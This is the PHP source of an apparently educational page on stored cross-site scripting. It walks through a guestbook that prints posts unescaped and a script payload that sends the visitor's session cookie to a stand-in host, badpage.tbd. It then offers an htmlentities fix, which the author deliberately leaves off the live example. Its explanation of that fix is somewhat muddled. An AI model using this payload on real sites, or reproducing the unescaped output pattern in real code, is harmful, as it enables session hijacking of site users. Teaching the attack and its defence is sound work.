<?php
	require('includes/functions.php');
	echo getHeader('Cross-Site Scripting (XSS)');
?>

    <!-- Main jumbotron for a primary marketing message or call to action -->
    <div class="jumbotron">
        <div class="container">
            <h1>Cross-Site Scripting (XSS)</h1>
			<a class="btn btn-primary btn-lg" href="/">
				<span class="glyphicon glyphicon-chevron-left"></span>
				Back To Home
			</a>
        </div>
    </div>

    <div class="container">
        <!-- Example row of columns -->
        <div class="row">
            <div class="col-md-12">
				
				<h2>Stealing Cookies</h2>
				<span>There are two types of XSS, one being persistent and the other temporary, in this example we will use a persistent XSS exploit to steal the PHP Session ID of the user who fell victim :)</span>
				<br><br><br>
				<span>First off, we have a <a href="/cross-site-scripting/example" target="_blank">very basic PHP guestbook page</a> which starts a session</span>
				<br><br>
				<h4>PHP</h4>
				<pre>
					<code class="php">
&lt;?php

session_start();

// attempt to connect to the database
try {

	$pdo = new PDO('mysql:host=serverlocation;dbname=databasename', 'username', 'password');

	$pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);

} catch (PDOException $ex) {
	echo $ex->getMessage();
	die('Critical Database Error Occured');
}

// did the user just try to add a post?
if (isset($_POST['message'])) {
	$stmt_add = $pdo->prepare('INSERT INTO xss (postID, message) VALUES (DEFAULT, :message)');
	$stmt_add->bindValue(':message', $_POST['message'], PDO::PARAM_STR);
	$stmt_add->execute();

	// prevent accidental resubmission via refresh
	header('Location: cross-site-scripting/example.php');
}

// fetch all posts
$stmt = $pdo->query('SELECT * FROM xss');

?&gt;
					</code>
				</pre>
				
				<h4>HTML</h4>
				<pre>
					<code class="html">
						<?php echo htmlentities('
<!DOCTYPE html>
<html lang="en">
<head>
	<title>XSS Example</title>
	<!-- Bootstrap -->
	<link href="/style/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>

	<div class="container">

		<h1>Guestbook! :)</h1>
		<hr>
		<br><br>
		<h3>Add a new post!</h3>
		<form action="xss_example.php" method="post">
			<textarea name="message" rows="4" cols="50"></textarea><br>
			<button type="submit">Submit</button>

		</form>

		<hr>
		<br>

		<h3>Existing Posts</h3>
		<hr>

						<span>Post ID: 1</span><br>
		<span>Post Content: 
			sfsf		</span>
		<br><br><br>
				<span>Post ID: 2</span><br>
		<span>Post Content: 
			test		</span>
		<br><br><br>
				<span>Post ID: 3</span><br>
		<span>Post Content: 
			testpost		</span>
		<br><br><br>

	</div>

	<!-- jQuery (necessary for Bootstraps JavaScript plugins) -->
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>

	<!-- Include all compiled plugins (below), or include individual files as needed -->
	<script src="/style/js/bootstrap.min.js"></script>

	<!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
	<script src="/style/js/ie10-viewport-bug-workaround.min.js"></script>

</body>
</html>
						'); ?>
					</code>
				</pre>
				
				This is a public guestbook, which any user who visits it can post anything they want. The PHP script uses paramaterized queries to protect against SQL injections of course, but not XSS attacks.
				
				Say a user was to post a message with the following in it:
				
				<pre>
					<code class="js">
						<?php echo htmlentities("
<script>
	var link = document.createElement('a');
	link.setAttribute('href', 'http://badpage.tbd/?cookiemonster=' + document.cookie);
	link.setAttribute('name', 'Bad Link');
	link.innerHTML = 'Click me to see the entire post :)';
	document.body.appendChild(link);
</script>
						"); ?>
					</code>
				</pre>
				
				At the bottom of the guest book page, a link will have been generated which is permenant as it is stored in the database. The link contents are as follows:
				
				<pre>
					<code class="html">
						<?php echo htmlentities('
<a href="http://badpage.tbd/?cookiemonster=PHPSESSID=ec8ned201pj1f9st9tdfeb6am6" name="Bad Link">Click me to see the entire post :)</a>
						') ?>
					</code>
				</pre>
				
				The implications of XSS are quite obvious, if an administrator was to click on this link, their PHP session ID would be transmitted to a remote server for storage, where an attacker could spoof a cookie and gain administrative access on the site.
				However, an attacker only has a set limit of time before the session has expired.
				
				<h3>Solution</h3>
				
				The solution to protecting yourself against XSS is simple, when adding a post to the database the script needs to encode the POST by converting the HTML special characters to their entities.
				This way, the browser will treat the code as HTML instead of parsing it. This will however break any styling, such as <b>Bold Text</b> for example.
				
				The modified PHP snippet below shows the patch to the PHP script for this massive security vulnerability. However I have not applied this fix to the example page as I want visitors to play around with it.
				
				<pre>
					<code class="php">	
$stmt_add->bindValue(':message', htmlentities($_POST['message']), PDO::PARAM_STR);
					</code>
				</pre>
				
			</div>
		</div>

<?php
	echo getFooter();
?>